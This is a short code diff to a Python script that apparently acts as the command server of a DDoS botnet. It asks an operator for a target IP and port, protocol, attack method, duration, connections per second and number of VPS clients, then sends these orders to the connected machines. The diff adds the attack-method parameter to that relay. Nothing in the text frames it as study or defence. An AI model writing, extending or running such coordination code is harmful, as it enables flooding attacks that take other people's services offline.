@@ -4,10 +4,10 @@ import socket
 import threading
 
 
-def handle_client(client_socket, client_name, target_ip, protocol, seconds, cps):
+def handle_client(client_socket, client_name, target_ip, protocol, method, seconds, cps):
     while True:
         if send_data:
-            all = f"{target_ip}??<><>{protocol}??<><>{seconds}??<><>{cps}"
+            all = f"{target_ip}??<><>{protocol}??<><>{method}??<><>{seconds}??<><>{cps}"
             client_socket.send(all.encode('utf-8'))
             break
     while True:
@@ -41,12 +41,14 @@ print("Enter target ip:port : ")
 target_ip = input()
 print("Enter protocol: ")
 protocol = input()
+print("Enter method: ")
+method = input()
 print("Enter seconds: ")
 seconds = input()
 print("Enter cps: ")
 cps = input()
 print("Enter number of clients: ")
-nodes = int(input("Enter no. of VPS: "))
+nodes = int(input(""))
 server_port = 35565
 send_data = False
-create_and_handle_server(target_ip, protocol, seconds, cps)
+create_and_handle_server(target_ip, protocol, method, seconds, cps)
